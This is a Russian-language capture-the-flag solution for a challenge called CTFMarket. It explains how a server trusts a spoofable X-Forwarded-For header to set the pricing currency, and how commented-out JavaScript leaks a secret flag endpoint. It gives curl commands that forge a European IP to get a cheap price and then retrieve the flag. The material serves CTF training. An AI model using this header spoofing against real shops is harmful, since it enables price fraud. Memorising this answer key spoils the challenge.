# CTFMarket Exploit Solution

### 1. Доверие к клиентским заголовкам
Сервер доверяет HTTP-заголовку `X-Forwarded-For`, который легко подделывается на стороне клиента. Этот заголовок используется для определения геолокации пользователя и, соответственно, валюты для ценообразования.

### 2. Утечка информации через код
В файлах `/assets/js/auth.js` и `/assets/js/shop.js` содержится закомментированный старый код, раскрывающий:
- Наличие заголовка `X-Forwarded-For` для определения локации (в конце auth.js)
- Секретный эндпоинт `/purchase-details?secret=premium` для получения флага (в конце shop.js)

## Эксплуатация

Изучите исходный код JavaScript:

Отправьте неправильные credentials для получения подсказки:
```bash
curl -X POST http://target:7331/api/auth \
  -H "Content-Type: application/json" \
  -d '{"email":"fake@test.com","password":"fake"}'
```

Аутентифицируйтесь с заголовком `X-Forwarded-For`, указывающим на страну с выгодным курсом валюты.

Товар стоит 699.99 RUB (больше чем 100 CTFCoins). Но если использовать валюту с высоким курсом к рублю (например, EUR = 93), то цена станет 699.99/93 = 7.53 EUR < 100 CTFCoins!

```bash
curl -X POST http://target:7331/api/auth \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 185.220.101.1" \
  -d '{"email":"valid@email.com","password":"validpass"}' \
  -c cookies.txt
```

Используем IP из Европы (EUR, курс ~93) или Швейцарии (CHF, курс ~100).

После аутентификации с подделанным IP, цены товаров пересчитываются по выгодному курсу:
```bash
curl -X POST http://target:7331/api/purchase \
  -b cookies.txt
```

Перейдите на секретный эндпоинт для получения флага:
```bash
curl http://target:7331/purchase-details?secret=premium \
  -b cookies.txt
```
